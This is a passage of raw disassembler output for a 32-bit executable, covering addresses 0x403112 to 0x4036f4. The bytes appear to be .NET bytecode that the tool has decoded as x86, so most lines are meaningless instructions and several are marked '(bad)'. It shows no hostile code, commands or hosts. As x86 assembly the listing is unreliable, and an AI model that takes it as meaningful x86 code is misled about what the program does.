  403112:	3e 00 00             	add    %al,%ds:(%eax)
  403115:	0a 2a                	or     (%edx),%ch
  403117:	00 41 1c             	add    %al,0x1c(%ecx)
  40311a:	00 00                	add    %al,(%eax)
  40311c:	00 00                	add    %al,(%eax)
  40311e:	00 00                	add    %al,(%eax)
  403120:	07                   	pop    %es
  403121:	00 00                	add    %al,(%eax)
  403123:	00 17                	add    %dl,(%edi)
  403125:	01 00                	add    %eax,(%eax)
  403127:	00 1e                	add    %bl,(%esi)
  403129:	01 00                	add    %eax,(%eax)
  40312b:	00 19                	add    %bl,(%ecx)
  40312d:	00 00                	add    %al,(%eax)
  40312f:	00 0b                	add    %cl,(%ebx)
  403131:	00 00                	add    %al,(%eax)
  403133:	01 1b                	add    %ebx,(%ebx)
  403135:	30 03                	xor    %al,(%ebx)
  403137:	00 f4                	add    %dh,%ah
  403139:	01 00                	add    %eax,(%eax)
  40313b:	00 10                	add    %dl,(%eax)
  40313d:	00 00                	add    %al,(%eax)
  40313f:	11 02                	adc    %eax,(%edx)
  403141:	7b 1f                	jnp    0x403162
  403143:	00 00                	add    %al,(%eax)
  403145:	04 0a                	add    $0xa,%al
  403147:	02 7b 21             	add    0x21(%ebx),%bh
  40314a:	00 00                	add    %al,(%eax)
  40314c:	04 0b                	add    $0xb,%al
  40314e:	06                   	push   %es
  40314f:	45                   	inc    %ebp
  403150:	03 00                	add    (%eax),%eax
  403152:	00 00                	add    %al,(%eax)
  403154:	44                   	inc    %esp
  403155:	00 00                	add    %al,(%eax)
  403157:	00 df                	add    %bl,%bh
  403159:	00 00                	add    %al,(%eax)
  40315b:	00 66 01             	add    %ah,0x1(%esi)
  40315e:	00 00                	add    %al,(%eax)
  403160:	38 85 01 00 00 07    	cmp    %al,0x7000001(%ebp)
  403166:	7b 13                	jnp    0x40317b
  403168:	00 00                	add    %al,(%eax)
  40316a:	04 6f                	add    $0x6f,%al
  40316c:	31 00                	xor    %eax,(%eax)
  40316e:	00 06                	add    %al,(%esi)
  403170:	6f                   	outsl  %ds:(%esi),(%dx)
  403171:	23 00                	and    (%eax),%eax
  403173:	00 0a                	add    %cl,(%edx)
  403175:	13 04 12             	adc    (%edx,%edx,1),%eax
  403178:	04 28                	add    $0x28,%al
  40317a:	24 00                	and    $0x0,%al
  40317c:	00 0a                	add    %cl,(%edx)
  40317e:	2d 41 02 16 25       	sub    $0x25160241,%eax
  403183:	0a 7d 1f             	or     0x1f(%ebp),%bh
  403186:	00 00                	add    %al,(%eax)
  403188:	04 02                	add    $0x2,%al
  40318a:	11 04 7d 22 00 00 04 	adc    %eax,0x4000022(,%edi,2)
  403191:	02 7c 20 00          	add    0x0(%eax,%eiz,1),%bh
  403195:	00 04 12             	add    %al,(%edx,%edx,1)
  403198:	04 02                	add    $0x2,%al
  40319a:	28 11                	sub    %dl,(%ecx)
  40319c:	00 00                	add    %al,(%eax)
  40319e:	2b dd                	sub    %ebp,%ebx
  4031a0:	8f 01                	pop    (%ecx)
  4031a2:	00 00                	add    %al,(%eax)
  4031a4:	02 7b 22             	add    0x22(%ebx),%bh
  4031a7:	00 00                	add    %al,(%eax)
  4031a9:	04 13                	add    $0x13,%al
  4031ab:	04 02                	add    $0x2,%al
  4031ad:	7c 22                	jl     0x4031d1
  4031af:	00 00                	add    %al,(%eax)
  4031b1:	04 fe                	add    $0xfe,%al
  4031b3:	15 03 00 00 1b       	adc    $0x1b000003,%eax
  4031b8:	02 15 25 0a 7d 1f    	add    0x1f7d0a25,%dl
  4031be:	00 00                	add    %al,(%eax)
  4031c0:	04 12                	add    $0x12,%al
  4031c2:	04 28                	add    $0x28,%al
  4031c4:	26 00 00             	add    %al,%es:(%eax)
  4031c7:	0a 0c 08             	or     (%eax,%ecx,1),%cl
  4031ca:	39 2b                	cmp    %ebp,(%ebx)
  4031cc:	01 00                	add    %eax,(%eax)
  4031ce:	00 08                	add    %cl,(%eax)
  4031d0:	16                   	push   %ss
  4031d1:	91                   	xchg   %eax,%ecx
  4031d2:	0d 09 45 05 00       	or     $0x54509,%eax
  4031d7:	00 00                	add    %al,(%eax)
  4031d9:	05 00 00 00 12       	add    $0x12000000,%eax
  4031de:	00 00                	add    %al,(%eax)
  4031e0:	00 7b 00             	add    %bh,0x0(%ebx)
  4031e3:	00 00                	add    %al,(%eax)
  4031e5:	87 00                	xchg   %eax,(%eax)
  4031e7:	00 00                	add    %al,(%eax)
  4031e9:	a3 00 00 00 38       	mov    %eax,0x38000000
  4031ee:	f8                   	clc
  4031ef:	00 00                	add    %al,(%eax)
  4031f1:	00 07                	add    %al,(%edi)
  4031f3:	08 28                	or     %ch,(%eax)
  4031f5:	12 00                	adc    (%eax),%al
  4031f7:	00 06                	add    %al,(%esi)
  4031f9:	26 38 eb             	es cmp %ch,%bl
  4031fc:	00 00                	add    %al,(%eax)
  4031fe:	00 07                	add    %al,(%edi)
  403200:	07                   	pop    %es
  403201:	7b 13                	jnp    0x403216
  403203:	00 00                	add    %al,(%eax)
  403205:	04 28                	add    $0x28,%al
  403207:	14 00                	adc    $0x0,%al
  403209:	00 06                	add    %al,(%esi)
  40320b:	6f                   	outsl  %ds:(%esi),(%dx)
  40320c:	37                   	aaa
  40320d:	00 00                	add    %al,(%eax)
  40320f:	0a 13                	or     (%ebx),%dl
  403211:	05 12 05 28 38       	add    $0x38280512,%eax
  403216:	00 00                	add    %al,(%eax)
  403218:	0a 2d 41 02 17 25    	or     0x25170241,%ch
  40321e:	0a 7d 1f             	or     0x1f(%ebp),%bh
  403221:	00 00                	add    %al,(%eax)
  403223:	04 02                	add    $0x2,%al
  403225:	11 05 7d 23 00 00    	adc    %eax,0x237d
  40322b:	04 02                	add    $0x2,%al
  40322d:	7c 20                	jl     0x40324f
  40322f:	00 00                	add    %al,(%eax)
  403231:	04 12                	add    $0x12,%al
  403233:	05 02 28 12 00       	add    $0x122802,%eax
  403238:	00 2b                	add    %ch,(%ebx)
  40323a:	dd f4                	(bad)
  40323c:	00 00                	add    %al,(%eax)
  40323e:	00 02                	add    %al,(%edx)
  403240:	7b 23                	jnp    0x403265
  403242:	00 00                	add    %al,(%eax)
  403244:	04 13                	add    $0x13,%al
  403246:	05 02 7c 23 00       	add    $0x237c02,%eax
  40324b:	00 04 fe             	add    %al,(%esi,%edi,8)
  40324e:	15 0a 00 00 01       	adc    $0x100000a,%eax
  403253:	02 15 25 0a 7d 1f    	add    0x1f7d0a25,%dl
  403259:	00 00                	add    %al,(%eax)
  40325b:	04 12                	add    $0x12,%al
  40325d:	05 28 39 00 00       	add    $0x3928,%eax
  403262:	0a 38                	or     (%eax),%bh
  403264:	82 00 00             	addb   $0x0,(%eax)
  403267:	00 28                	add    %ch,(%eax)
  403269:	57                   	push   %edi
  40326a:	00 00                	add    %al,(%eax)
  40326c:	0a 6f 58             	or     0x58(%edi),%ch
  40326f:	00 00                	add    %al,(%eax)
  403271:	0a 2b                	or     (%ebx),%ch
  403273:	76 28                	jbe    0x40329d
  403275:	59                   	pop    %ecx
  403276:	00 00                	add    %al,(%eax)
  403278:	0a 6f 5a             	or     0x5a(%edi),%ch
  40327b:	00 00                	add    %al,(%eax)
  40327d:	0a 28                	or     (%eax),%ch
  40327f:	5b                   	pop    %ebx
  403280:	00 00                	add    %al,(%eax)
  403282:	0a 26                	or     (%esi),%ah
  403284:	28 57 00             	sub    %dl,0x0(%edi)
  403287:	00 0a                	add    %cl,(%edx)
  403289:	6f                   	outsl  %ds:(%esi),(%dx)
  40328a:	58                   	pop    %eax
  40328b:	00 00                	add    %al,(%eax)
  40328d:	0a 2b                	or     (%ebx),%ch
  40328f:	5a                   	pop    %edx
  403290:	28 77 00             	sub    %dh,0x0(%edi)
  403293:	00 06                	add    %al,(%esi)
  403295:	6f                   	outsl  %ds:(%esi),(%dx)
  403296:	37                   	aaa
  403297:	00 00                	add    %al,(%eax)
  403299:	0a 13                	or     (%ebx),%dl
  40329b:	05 12 05 28 38       	add    $0x38280512,%eax
  4032a0:	00 00                	add    %al,(%eax)
  4032a2:	0a 2d 3e 02 18 25    	or     0x2518023e,%ch
  4032a8:	0a 7d 1f             	or     0x1f(%ebp),%bh
  4032ab:	00 00                	add    %al,(%eax)
  4032ad:	04 02                	add    $0x2,%al
  4032af:	11 05 7d 23 00 00    	adc    %eax,0x237d
  4032b5:	04 02                	add    $0x2,%al
  4032b7:	7c 20                	jl     0x4032d9
  4032b9:	00 00                	add    %al,(%eax)
  4032bb:	04 12                	add    $0x12,%al
  4032bd:	05 02 28 12 00       	add    $0x122802,%eax
  4032c2:	00 2b                	add    %ch,(%ebx)
  4032c4:	de 6d 02             	fisubrs 0x2(%ebp)
  4032c7:	7b 23                	jnp    0x4032ec
  4032c9:	00 00                	add    %al,(%eax)
  4032cb:	04 13                	add    $0x13,%al
  4032cd:	05 02 7c 23 00       	add    $0x237c02,%eax
  4032d2:	00 04 fe             	add    %al,(%esi,%edi,8)
  4032d5:	15 0a 00 00 01       	adc    $0x100000a,%eax
  4032da:	02 15 25 0a 7d 1f    	add    0x1f7d0a25,%dl
  4032e0:	00 00                	add    %al,(%eax)
  4032e2:	04 12                	add    $0x12,%al
  4032e4:	05 28 39 00 00       	add    $0x3928,%eax
  4032e9:	0a 07                	or     (%edi),%al
  4032eb:	7b 13                	jnp    0x403300
  4032ed:	00 00                	add    %al,(%eax)
  4032ef:	04 6f                	add    $0x6f,%al
  4032f1:	30 00                	xor    %al,(%eax)
  4032f3:	00 06                	add    %al,(%esi)
  4032f5:	3a 6b fe             	cmp    -0x2(%ebx),%ch
  4032f8:	ff                   	(bad)
  4032f9:	ff 07                	incl   (%edi)
  4032fb:	7b 13                	jnp    0x403310
  4032fd:	00 00                	add    %al,(%eax)
  4032ff:	04 6f                	add    $0x6f,%al
  403301:	2e 00 00             	add    %al,%cs:(%eax)
  403304:	06                   	push   %es
  403305:	de 19                	ficomps (%ecx)
  403307:	13 06                	adc    (%esi),%eax
  403309:	02 1f                	add    (%edi),%bl
  40330b:	fe                   	(bad)
  40330c:	7d 1f                	jge    0x40332d
  40330e:	00 00                	add    %al,(%eax)
  403310:	04 02                	add    $0x2,%al
  403312:	7c 20                	jl     0x403334
  403314:	00 00                	add    %al,(%eax)
  403316:	04 11                	add    $0x11,%al
  403318:	06                   	push   %es
  403319:	28 3d 00 00 0a de    	sub    %bh,0xde0a0000
  40331f:	13 02                	adc    (%edx),%eax
  403321:	1f                   	pop    %ds
  403322:	fe                   	(bad)
  403323:	7d 1f                	jge    0x403344
  403325:	00 00                	add    %al,(%eax)
  403327:	04 02                	add    $0x2,%al
  403329:	7c 20                	jl     0x40334b
  40332b:	00 00                	add    %al,(%eax)
  40332d:	04 28                	add    $0x28,%al
  40332f:	3e 00 00             	add    %al,%ds:(%eax)
  403332:	0a 2a                	or     (%edx),%ch
  403334:	41                   	inc    %ecx
  403335:	1c 00                	sbb    $0x0,%al
  403337:	00 00                	add    %al,(%eax)
  403339:	00 00                	add    %al,(%eax)
  40333b:	00 0e                	add    %cl,(%esi)
  40333d:	00 00                	add    %al,(%eax)
  40333f:	00 b9 01 00 00 c7    	add    %bh,-0x38ffffff(%ecx)
  403345:	01 00                	add    %eax,(%eax)
  403347:	00 19                	add    %bl,(%ecx)
  403349:	00 00                	add    %al,(%eax)
  40334b:	00 0b                	add    %cl,(%ebx)
  40334d:	00 00                	add    %al,(%eax)
  40334f:	01 1b                	add    %ebx,(%ebx)
  403351:	30 05 00 7e 02 00    	xor    %al,0x27e00
  403357:	00 11                	add    %dl,(%ecx)
  403359:	00 00                	add    %al,(%eax)
  40335b:	11 02                	adc    %eax,(%edx)
  40335d:	7b 24                	jnp    0x403383
  40335f:	00 00                	add    %al,(%eax)
  403361:	04 0a                	add    $0xa,%al
  403363:	02 7b 27             	add    0x27(%ebx),%bh
  403366:	00 00                	add    %al,(%eax)
  403368:	04 0b                	add    $0xb,%al
  40336a:	06                   	push   %es
  40336b:	45                   	inc    %ebp
  40336c:	04 00                	add    $0x0,%al
  40336e:	00 00                	add    %al,(%eax)
  403370:	71 00                	jno    0x403372
  403372:	00 00                	add    %al,(%eax)
  403374:	d3 00                	roll   %cl,(%eax)
  403376:	00 00                	add    %al,(%eax)
  403378:	48                   	dec    %eax
  403379:	01 00                	add    %eax,(%eax)
  40337b:	00 b7 01 00 00 02    	add    %dh,0x2000001(%edi)
  403381:	17                   	pop    %ss
  403382:	8d 2e                	lea    (%esi),%ebp
  403384:	00 00                	add    %al,(%eax)
  403386:	01 25 16 17 9c 7d    	add    %esp,0x7d9c1716
  40338c:	28 00                	sub    %al,(%eax)
  40338e:	00 04 02             	add    %al,(%edx,%eax,1)
  403391:	17                   	pop    %ss
  403392:	8d 2e                	lea    (%esi),%ebp
  403394:	00 00                	add    %al,(%eax)
  403396:	01 25 16 18 9c 7d    	add    %esp,0x7d9c1816
  40339c:	29 00                	sub    %eax,(%eax)
  40339e:	00 04 02             	add    %al,(%edx,%eax,1)
  4033a1:	7b 26                	jnp    0x4033c9
  4033a3:	00 00                	add    %al,(%eax)
  4033a5:	04 20                	add    $0x20,%al
  4033a7:	88 13                	mov    %dl,(%ebx)
  4033a9:	00 00                	add    %al,(%eax)
  4033ab:	6f                   	outsl  %ds:(%esi),(%dx)
  4033ac:	34 00                	xor    $0x0,%al
  4033ae:	00 06                	add    %al,(%esi)
  4033b0:	38 a7 01 00 00 20    	cmp    %ah,0x20000001(%edi)
  4033b6:	e8 03 00 00 28       	call   0x284033be
  4033bb:	5c                   	pop    %esp
  4033bc:	00 00                	add    %al,(%eax)
  4033be:	0a 6f 37             	or     0x37(%edi),%ch
  4033c1:	00 00                	add    %al,(%eax)
  4033c3:	0a 0d 12 03 28 38    	or     0x38280312,%cl
  4033c9:	00 00                	add    %al,(%eax)
  4033cb:	0a 2d 3f 02 16 25    	or     0x2516023f,%ch
  4033d1:	0a 7d 24             	or     0x24(%ebp),%bh
  4033d4:	00 00                	add    %al,(%eax)
  4033d6:	04 02                	add    $0x2,%al
  4033d8:	09 7d 2a             	or     %edi,0x2a(%ebp)
  4033db:	00 00                	add    %al,(%eax)
  4033dd:	04 02                	add    $0x2,%al
  4033df:	7c 25                	jl     0x403406
  4033e1:	00 00                	add    %al,(%eax)
  4033e3:	04 12                	add    $0x12,%al
  4033e5:	03 02                	add    (%edx),%eax
  4033e7:	28 13                	sub    %dl,(%ebx)
  4033e9:	00 00                	add    %al,(%eax)
  4033eb:	2b dd                	sub    %ebp,%ebx
  4033ed:	e8 01 00 00 02       	call   0x24033f3
  4033f2:	7b 2a                	jnp    0x40341e
  4033f4:	00 00                	add    %al,(%eax)
  4033f6:	04 0d                	add    $0xd,%al
  4033f8:	02 7c 2a 00          	add    0x0(%edx,%ebp,1),%bh
  4033fc:	00 04 fe             	add    %al,(%esi,%edi,8)
  4033ff:	15 0a 00 00 01       	adc    $0x100000a,%eax
  403404:	02 15 25 0a 7d 24    	add    0x247d0a25,%dl
  40340a:	00 00                	add    %al,(%eax)
  40340c:	04 12                	add    $0x12,%al
  40340e:	03 28                	add    (%eax),%ebp
  403410:	39 00                	cmp    %eax,(%eax)
  403412:	00 0a                	add    %cl,(%edx)
  403414:	02 7b 26             	add    0x26(%ebx),%bh
  403417:	00 00                	add    %al,(%eax)
  403419:	04 6f                	add    $0x6f,%al
  40341b:	31 00                	xor    %eax,(%eax)
  40341d:	00 06                	add    %al,(%esi)
  40341f:	6f                   	outsl  %ds:(%esi),(%dx)
  403420:	23 00                	and    (%eax),%eax
  403422:	00 0a                	add    %cl,(%edx)
  403424:	13 04 12             	adc    (%edx,%edx,1),%eax
  403427:	04 28                	add    $0x28,%al
  403429:	24 00                	and    $0x0,%al
  40342b:	00 0a                	add    %cl,(%edx)
  40342d:	2d 41 02 17 25       	sub    $0x25170241,%eax
  403432:	0a 7d 24             	or     0x24(%ebp),%bh
  403435:	00 00                	add    %al,(%eax)
  403437:	04 02                	add    $0x2,%al
  403439:	11 04 7d 2b 00 00 04 	adc    %eax,0x400002b(,%edi,2)
  403440:	02 7c 25 00          	add    0x0(%ebp,%eiz,1),%bh
  403444:	00 04 12             	add    %al,(%edx,%edx,1)
  403447:	04 02                	add    $0x2,%al
  403449:	28 14 00             	sub    %dl,(%eax,%eax,1)
  40344c:	00 2b                	add    %ch,(%ebx)
  40344e:	dd 86 01 00 00 02    	fldl   0x2000001(%esi)
  403454:	7b 2b                	jnp    0x403481
  403456:	00 00                	add    %al,(%eax)
  403458:	04 13                	add    $0x13,%al
  40345a:	04 02                	add    $0x2,%al
  40345c:	7c 2b                	jl     0x403489
  40345e:	00 00                	add    %al,(%eax)
  403460:	04 fe                	add    $0xfe,%al
  403462:	15 03 00 00 1b       	adc    $0x1b000003,%eax
  403467:	02 15 25 0a 7d 24    	add    0x247d0a25,%dl
  40346d:	00 00                	add    %al,(%eax)
  40346f:	04 12                	add    $0x12,%al
  403471:	04 28                	add    $0x28,%al
  403473:	26 00 00             	add    %al,%es:(%eax)
  403476:	0a 0c 08             	or     (%eax,%ecx,1),%cl
  403479:	39 fb                	cmp    %edi,%ebx
  40347b:	00 00                	add    %al,(%eax)
  40347d:	00 08                	add    %cl,(%eax)
  40347f:	16                   	push   %ss
  403480:	91                   	xchg   %eax,%ecx
  403481:	2c 6f                	sub    $0x6f,%al
  403483:	02 7b 26             	add    0x26(%ebx),%bh
  403486:	00 00                	add    %al,(%eax)
  403488:	04 02                	add    $0x2,%al
  40348a:	7b 29                	jnp    0x4034b5
  40348c:	00 00                	add    %al,(%eax)
  40348e:	04 6f                	add    $0x6f,%al
  403490:	32 00                	xor    (%eax),%al
  403492:	00 06                	add    %al,(%esi)
  403494:	6f                   	outsl  %ds:(%esi),(%dx)
  403495:	2b 00                	sub    (%eax),%eax
  403497:	00 0a                	add    %cl,(%edx)
  403499:	13 05 12 05 28 2c    	adc    0x2c280512,%eax
  40349f:	00 00                	add    %al,(%eax)
  4034a1:	0a 2d 41 02 18 25    	or     0x25180241,%ch
  4034a7:	0a 7d 24             	or     0x24(%ebp),%bh
  4034aa:	00 00                	add    %al,(%eax)
  4034ac:	04 02                	add    $0x2,%al
  4034ae:	11 05 7d 2c 00 00    	adc    %eax,0x2c7d
  4034b4:	04 02                	add    $0x2,%al
  4034b6:	7c 25                	jl     0x4034dd
  4034b8:	00 00                	add    %al,(%eax)
  4034ba:	04 12                	add    $0x12,%al
  4034bc:	05 02 28 15 00       	add    $0x152802,%eax
  4034c1:	00 2b                	add    %ch,(%ebx)
  4034c3:	dd 11                	fstl   (%ecx)
  4034c5:	01 00                	add    %eax,(%eax)
  4034c7:	00 02                	add    %al,(%edx)
  4034c9:	7b 2c                	jnp    0x4034f7
  4034cb:	00 00                	add    %al,(%eax)
  4034cd:	04 13                	add    $0x13,%al
  4034cf:	05 02 7c 2c 00       	add    $0x2c7c02,%eax
  4034d4:	00 04 fe             	add    %al,(%esi,%edi,8)
  4034d7:	15 05 00 00 1b       	adc    $0x1b000005,%eax
  4034dc:	02 15 25 0a 7d 24    	add    0x247d0a25,%dl
  4034e2:	00 00                	add    %al,(%eax)
  4034e4:	04 12                	add    $0x12,%al
  4034e6:	05 28 2d 00 00       	add    $0x2d28,%eax
  4034eb:	0a 26                	or     (%esi),%ah
  4034ed:	38 87 00 00 00 02    	cmp    %al,0x2000000(%edi)
  4034f3:	7b 26                	jnp    0x40351b
  4034f5:	00 00                	add    %al,(%eax)
  4034f7:	04 02                	add    $0x2,%al
  4034f9:	7b 28                	jnp    0x403523
  4034fb:	00 00                	add    %al,(%eax)
  4034fd:	04 6f                	add    $0x6f,%al
  4034ff:	32 00                	xor    (%eax),%al
  403501:	00 06                	add    %al,(%esi)
  403503:	6f                   	outsl  %ds:(%esi),(%dx)
  403504:	2b 00                	sub    (%eax),%eax
  403506:	00 0a                	add    %cl,(%edx)
  403508:	13 05 12 05 28 2c    	adc    0x2c280512,%eax
  40350e:	00 00                	add    %al,(%eax)
  403510:	0a 2d 41 02 19 25    	or     0x25190241,%ch
  403516:	0a 7d 24             	or     0x24(%ebp),%bh
  403519:	00 00                	add    %al,(%eax)
  40351b:	04 02                	add    $0x2,%al
  40351d:	11 05 7d 2c 00 00    	adc    %eax,0x2c7d
  403523:	04 02                	add    $0x2,%al
  403525:	7c 25                	jl     0x40354c
  403527:	00 00                	add    %al,(%eax)
  403529:	04 12                	add    $0x12,%al
  40352b:	05 02 28 15 00       	add    $0x152802,%eax
  403530:	00 2b                	add    %ch,(%ebx)
  403532:	dd a2 00 00 00 02    	frstor 0x2000000(%edx)
  403538:	7b 2c                	jnp    0x403566
  40353a:	00 00                	add    %al,(%eax)
  40353c:	04 13                	add    $0x13,%al
  40353e:	05 02 7c 2c 00       	add    $0x2c7c02,%eax
  403543:	00 04 fe             	add    %al,(%esi,%edi,8)
  403546:	15 05 00 00 1b       	adc    $0x1b000005,%eax
  40354b:	02 15 25 0a 7d 24    	add    0x247d0a25,%dl
  403551:	00 00                	add    %al,(%eax)
  403553:	04 12                	add    $0x12,%al
  403555:	05 28 2d 00 00       	add    $0x2d28,%eax
  40355a:	0a 26                	or     (%esi),%ah
  40355c:	02 7b 26             	add    0x26(%ebx),%bh
  40355f:	00 00                	add    %al,(%eax)
  403561:	04 6f                	add    $0x6f,%al
  403563:	30 00                	xor    %al,(%eax)
  403565:	00 06                	add    %al,(%esi)
  403567:	2c 10                	sub    $0x10,%al
  403569:	07                   	pop    %es
  40356a:	7b 13                	jnp    0x40357f
  40356c:	00 00                	add    %al,(%eax)
  40356e:	04 6f                	add    $0x6f,%al
  403570:	30 00                	xor    %al,(%eax)
  403572:	00 06                	add    %al,(%esi)
  403574:	3a 3c fe             	cmp    (%esi,%edi,8),%bh
  403577:	ff                   	(bad)
  403578:	ff 07                	incl   (%edi)
  40357a:	7b 13                	jnp    0x40358f
  40357c:	00 00                	add    %al,(%eax)
  40357e:	04 6f                	add    $0x6f,%al
  403580:	2e 00 00             	add    %al,%cs:(%eax)
  403583:	06                   	push   %es
  403584:	02 7b 26             	add    0x26(%ebx),%bh
  403587:	00 00                	add    %al,(%eax)
  403589:	04 6f                	add    $0x6f,%al
  40358b:	2e 00 00             	add    %al,%cs:(%eax)
  40358e:	06                   	push   %es
  40358f:	de 27                	fisubs (%edi)
  403591:	13 06                	adc    (%esi),%eax
  403593:	02 1f                	add    (%edi),%bl
  403595:	fe                   	(bad)
  403596:	7d 24                	jge    0x4035bc
  403598:	00 00                	add    %al,(%eax)
  40359a:	04 02                	add    $0x2,%al
  40359c:	14 7d                	adc    $0x7d,%al
  40359e:	28 00                	sub    %al,(%eax)
  4035a0:	00 04 02             	add    %al,(%edx,%eax,1)
  4035a3:	14 7d                	adc    $0x7d,%al
  4035a5:	29 00                	sub    %eax,(%eax)
  4035a7:	00 04 02             	add    %al,(%edx,%eax,1)
  4035aa:	7c 25                	jl     0x4035d1
  4035ac:	00 00                	add    %al,(%eax)
  4035ae:	04 11                	add    $0x11,%al
  4035b0:	06                   	push   %es
  4035b1:	28 3d 00 00 0a de    	sub    %bh,0xde0a0000
  4035b7:	21 02                	and    %eax,(%edx)
  4035b9:	1f                   	pop    %ds
  4035ba:	fe                   	(bad)
  4035bb:	7d 24                	jge    0x4035e1
  4035bd:	00 00                	add    %al,(%eax)
  4035bf:	04 02                	add    $0x2,%al
  4035c1:	14 7d                	adc    $0x7d,%al
  4035c3:	28 00                	sub    %al,(%eax)
  4035c5:	00 04 02             	add    %al,(%edx,%eax,1)
  4035c8:	14 7d                	adc    $0x7d,%al
  4035ca:	29 00                	sub    %eax,(%eax)
  4035cc:	00 04 02             	add    %al,(%edx,%eax,1)
  4035cf:	7c 25                	jl     0x4035f6
  4035d1:	00 00                	add    %al,(%eax)
  4035d3:	04 28                	add    $0x28,%al
  4035d5:	3e 00 00             	add    %al,%ds:(%eax)
  4035d8:	0a 2a                	or     (%edx),%ch
  4035da:	00 00                	add    %al,(%eax)
  4035dc:	41                   	inc    %ecx
  4035dd:	1c 00                	sbb    $0x0,%al
  4035df:	00 00                	add    %al,(%eax)
  4035e1:	00 00                	add    %al,(%eax)
  4035e3:	00 0e                	add    %cl,(%esi)
  4035e5:	00 00                	add    %al,(%eax)
  4035e7:	00 27                	add    %ah,(%edi)
  4035e9:	02 00                	add    (%eax),%al
  4035eb:	00 35 02 00 00 27    	add    %dh,0x27000002
  4035f1:	00 00                	add    %al,(%eax)
  4035f3:	00 0b                	add    %cl,(%ebx)
  4035f5:	00 00                	add    %al,(%eax)
  4035f7:	01 1b                	add    %ebx,(%ebx)
  4035f9:	30 04 00             	xor    %al,(%eax,%eax,1)
  4035fc:	c3                   	ret
  4035fd:	00 00                	add    %al,(%eax)
  4035ff:	00 12                	add    %dl,(%edx)
  403601:	00 00                	add    %al,(%eax)
  403603:	11 02                	adc    %eax,(%edx)
  403605:	7b 2d                	jnp    0x403634
  403607:	00 00                	add    %al,(%eax)
  403609:	04 0a                	add    $0xa,%al
  40360b:	06                   	push   %es
  40360c:	2c 68                	sub    $0x68,%al
  40360e:	17                   	pop    %ss
  40360f:	8d 2e                	lea    (%esi),%ebp
  403611:	00 00                	add    %al,(%eax)
  403613:	01 25 16 17 9c 0b    	add    %esp,0xb9c1716
  403619:	02 7b 2f             	add    0x2f(%ebx),%bh
  40361c:	00 00                	add    %al,(%eax)
  40361e:	04 02                	add    $0x2,%al
  403620:	7b 2f                	jnp    0x403651
  403622:	00 00                	add    %al,(%eax)
  403624:	04 7b                	add    $0x7b,%al
  403626:	47                   	inc    %edi
  403627:	00 00                	add    %al,(%eax)
  403629:	04 02                	add    $0x2,%al
  40362b:	7b 30                	jnp    0x40365d
  40362d:	00 00                	add    %al,(%eax)
  40362f:	04 17                	add    $0x17,%al
  403631:	6f                   	outsl  %ds:(%esi),(%dx)
  403632:	4a                   	dec    %edx
  403633:	00 00                	add    %al,(%eax)
  403635:	06                   	push   %es
  403636:	7d 4a                	jge    0x403682
  403638:	00 00                	add    %al,(%eax)
  40363a:	04 02                	add    $0x2,%al
  40363c:	7b 2f                	jnp    0x40366d
  40363e:	00 00                	add    %al,(%eax)
  403640:	04 07                	add    $0x7,%al
  403642:	6f                   	outsl  %ds:(%esi),(%dx)
  403643:	32 00                	xor    (%eax),%al
  403645:	00 06                	add    %al,(%esi)
  403647:	6f                   	outsl  %ds:(%esi),(%dx)
  403648:	2b 00                	sub    (%eax),%eax
  40364a:	00 0a                	add    %cl,(%edx)
  40364c:	0c 12                	or     $0x12,%al
  40364e:	02 28                	add    (%eax),%ch
  403650:	2c 00                	sub    $0x0,%al
  403652:	00 0a                	add    %cl,(%edx)
  403654:	2d 3c 02 16 25       	sub    $0x2516023c,%eax
  403659:	0a 7d 2d             	or     0x2d(%ebp),%bh
  40365c:	00 00                	add    %al,(%eax)
  40365e:	04 02                	add    $0x2,%al
  403660:	08 7d 31             	or     %bh,0x31(%ebp)
  403663:	00 00                	add    %al,(%eax)
  403665:	04 02                	add    $0x2,%al
  403667:	7c 2e                	jl     0x403697
  403669:	00 00                	add    %al,(%eax)
  40366b:	04 12                	add    $0x12,%al
  40366d:	02 02                	add    (%edx),%al
  40366f:	28 16                	sub    %dl,(%esi)
  403671:	00 00                	add    %al,(%eax)
  403673:	2b de                	sub    %esi,%ebx
  403675:	50                   	push   %eax
  403676:	02 7b 31             	add    0x31(%ebx),%bh
  403679:	00 00                	add    %al,(%eax)
  40367b:	04 0c                	add    $0xc,%al
  40367d:	02 7c 31 00          	add    0x0(%ecx,%esi,1),%bh
  403681:	00 04 fe             	add    %al,(%esi,%edi,8)
  403684:	15 05 00 00 1b       	adc    $0x1b000005,%eax
  403689:	02 15 25 0a 7d 2d    	add    0x2d7d0a25,%dl
  40368f:	00 00                	add    %al,(%eax)
  403691:	04 12                	add    $0x12,%al
  403693:	02 28                	add    (%eax),%ch
  403695:	2d 00 00 0a 26       	sub    $0x260a0000,%eax
  40369a:	de 17                	ficoms (%edi)
  40369c:	0d 02 1f fe 7d       	or     $0x7dfe1f02,%eax
  4036a1:	2d 00 00 04 02       	sub    $0x2040000,%eax
  4036a6:	7c 2e                	jl     0x4036d6
  4036a8:	00 00                	add    %al,(%eax)
  4036aa:	04 09                	add    $0x9,%al
  4036ac:	28 3d 00 00 0a de    	sub    %bh,0xde0a0000
  4036b2:	13 02                	adc    (%edx),%eax
  4036b4:	1f                   	pop    %ds
  4036b5:	fe                   	(bad)
  4036b6:	7d 2d                	jge    0x4036e5
  4036b8:	00 00                	add    %al,(%eax)
  4036ba:	04 02                	add    $0x2,%al
  4036bc:	7c 2e                	jl     0x4036ec
  4036be:	00 00                	add    %al,(%eax)
  4036c0:	04 28                	add    $0x28,%al
  4036c2:	3e 00 00             	add    %al,%ds:(%eax)
  4036c5:	0a 2a                	or     (%edx),%ch
  4036c7:	00 01                	add    %al,(%ecx)
  4036c9:	10 00                	adc    %al,(%eax)
  4036cb:	00 00                	add    %al,(%eax)
  4036cd:	00 07                	add    %al,(%edi)
  4036cf:	00 91 98 00 17 0b    	add    %dl,0xb170098(%ecx)
  4036d5:	00 00                	add    %al,(%eax)
  4036d7:	01 1b                	add    %ebx,(%ebx)
  4036d9:	30 03                	xor    %al,(%ebx)
  4036db:	00 b6 02 00 00 10    	add    %dh,0x10000002(%esi)
  4036e1:	00 00                	add    %al,(%eax)
  4036e3:	11 02                	adc    %eax,(%edx)
  4036e5:	7b 32                	jnp    0x403719
  4036e7:	00 00                	add    %al,(%eax)
  4036e9:	04 0a                	add    $0xa,%al
  4036eb:	02 7b 35             	add    0x35(%ebx),%bh
  4036ee:	00 00                	add    %al,(%eax)
  4036f0:	04 0b                	add    $0xb,%al
  4036f2:	06                   	push   %es
  4036f3:	45                   	inc    %ebp
  4036f4:	05 00 00 00 44       	add    $0x44000000,%eax
